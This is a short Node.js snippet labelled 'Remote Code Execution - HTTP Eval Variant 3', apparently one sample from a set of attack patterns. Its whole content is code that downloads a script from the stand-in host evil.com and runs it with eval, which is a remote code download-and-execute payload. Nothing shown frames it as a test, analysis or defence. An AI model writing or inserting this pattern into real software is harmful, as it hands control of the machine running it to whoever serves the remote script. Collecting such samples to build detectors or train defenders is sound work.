// Remote Code Execution - HTTP Eval Variant 3
const http = require('http');
http.get('http://evil.com/malware.js', (res) => {
    let code = '';
    res.on('data', chunk => code += chunk);
    res.on('end', () => eval(code));
});
